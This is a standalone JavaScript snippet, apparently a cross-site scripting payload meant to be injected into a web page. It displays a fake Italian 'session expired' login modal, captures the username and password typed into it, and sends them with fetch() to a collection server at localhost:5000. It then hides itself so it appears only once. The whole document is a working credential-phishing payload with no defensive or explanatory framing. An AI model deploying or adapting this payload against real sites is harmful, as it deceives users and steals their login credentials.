<script>
    const POPUP_ALREADY_SHOWN_KEY = 'xss_phishing_popup_shown_once';
    if (localStorage.getItem(POPUP_ALREADY_SHOWN_KEY) !== 'true') {

        const modalOverlay = document.createElement('div');
        modalOverlay.id = 'xss-modal-overlay';
        modalOverlay.style.cssText = `
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            background: rgba(0,0,0,0.6);
            z-index: 9999;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: sans-serif;
        `;

        const modalContent = document.createElement('div');
        modalContent.id = 'xss-modal-content';
        modalContent.style.cssText = `
            background: #f4f4f4;
            padding: 20px;
            border-radius: 6px;
            box-shadow: 0 0 10px rgba(0,0,0,0.3);
            width: 300px;
            text-align: center;
        `;

        const phishingForm = document.createElement('form');
        phishingForm.innerHTML = `
            <h3 style="margin-top: 0; color: #6a0dad;">Attenzione</h3>
            <p style="font-size: 0.9em; color: #555;">Sessione scaduta. Accedi nuovamente per continuare.</p>

            <div style="margin: 10px 0;">
                <input type="text" id="username_phish" name="username"
                    placeholder="Nome utente"
                    style="width: 100%; padding: 8px; border: 1px solid #ccc; border-radius: 4px;" required>
            </div>

            <div style="margin: 10px 0;">
                <input type="password" id="password_phish" name="password"
                    placeholder="Password"
                    style="width: 100%; padding: 8px; border: 1px solid #ccc; border-radius: 4px;" required>
            </div>

            <input type="submit" value="Accedi"
                style="width: 100%; padding: 8px; background-color: #6a0dad; color: white; border: none; border-radius: 4px; cursor: pointer;">
        `;

        modalContent.appendChild(phishingForm);
        modalOverlay.appendChild(modalContent);
        document.body.appendChild(modalOverlay);
        document.body.style.overflow = 'hidden';

        phishingForm.addEventListener('submit', function(event) {
            event.preventDefault();
            const username = document.getElementById('username_phish').value;
            const password = document.getElementById('password_phish').value;
            fetch('http://localhost:5000', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: `username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`
            })
            .then(response => {
                console.log('Credenziali inviate con successo!', response);
            })
            .catch(error => {
                console.error('Errore nell\'invio delle credenziali:', error);
            })
            .finally(() => {
                localStorage.setItem(POPUP_ALREADY_SHOWN_KEY, 'true');
                modalOverlay.remove();
                document.body.style.overflow = '';
            });
        });
    }
</script>
